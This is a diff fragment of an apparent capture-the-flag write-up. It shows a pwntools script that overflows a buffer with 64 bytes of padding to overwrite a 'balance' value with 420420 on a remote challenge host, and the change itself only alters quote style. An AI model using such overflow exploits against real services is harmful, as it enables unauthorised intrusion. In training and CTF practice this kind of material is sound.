@@ -47,7 +47,7 @@ We exploit buffer overflow to overwrite `balance` with 420420 to pass the check:
 ```py
 from pwn import *
 conn = remote('61.28.237.24', 30203)
-conn.sendlineafter("name:", b'a' * 64 + p32(420420))
+conn.sendlineafter('name:', b'a' * 64 + p32(420420))
 conn.interactive()
 ```
 
